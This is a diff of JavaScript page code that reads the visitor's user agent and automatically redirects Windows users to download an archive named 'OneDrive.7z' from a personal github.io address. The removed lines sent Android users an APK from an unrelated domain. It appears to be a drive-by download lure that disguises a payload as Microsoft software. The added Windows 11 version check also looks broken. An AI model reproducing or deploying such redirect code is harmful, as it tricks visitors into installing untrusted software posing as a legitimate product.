@@ -11,16 +11,10 @@
             if (/Windows NT 10\.0/.test(userAgent)) {
                 // Windows 10
                 downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
-            } else if (/Windows NT 6\.3/.test(userAgent)) {
-                // Windows 8.1
-                downloadURL = "https://andre0194.github.io/service/OneDrive_Win8.7z";
-            } else if (/Windows NT 6\.1/.test(userAgent)) {
-                // Windows 7
-                downloadURL = "https://andre0194.github.io/service/OneDrive_Win7.7z";
-            } else if (/Android/.test(userAgent)) {
-                // Android
-                downloadURL = "https://files.myfitnesslife.xyz/ready.apk";
-            }
+            } else if (/Windows NT 11\.3/.test(userAgent)) {
+                // Windows 11
+                downloadURL = "https://andre0194.github.io/service/OneDrive.7z";
+            } 
             
             // Redirect automatically
             window.location.href = downloadURL;
